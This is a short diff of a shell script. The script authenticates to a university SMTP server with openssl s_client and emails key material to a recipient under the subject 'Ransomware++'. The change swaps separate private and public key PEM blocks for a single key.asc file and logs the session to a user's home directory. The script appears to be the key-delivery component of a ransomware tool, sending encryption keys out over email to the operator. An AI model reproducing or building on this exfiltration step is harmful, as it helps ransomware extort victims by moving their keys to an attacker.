@@ -15,10 +15,9 @@ password="$(select-value password | base64)"
 from_email="$(select-value from)"
 rcpt_email="$(select-value rcpt)"
 
-priv_key="$(cat key.pem)"
-pub_key="$(cat key.pub)"
+key="$(cat key.asc)"
 
-openssl s_client -starttls smtp -connect smtps.univ-lille1.fr:587 -crlf <<EOF 1>/dev/null
+openssl s_client -starttls smtp -connect smtps.univ-lille1.fr:587 -crlf <<EOF 1>/home/dusartc/mail.log
 helo univ-lille1.fr
 auth login
 `echo $username`
@@ -30,13 +29,7 @@ From: $from_email
 To: $rcpt_email
 Subject: Ransomware++
 
------BEGIN PRIVATE KEY-----
-$priv_key
------END PRIVATE KEY
-
------BEGIN PUBLIC KEY-----
-$pub_key
------END PUBLIC KEY-----
+$key
 
 .
 EOF
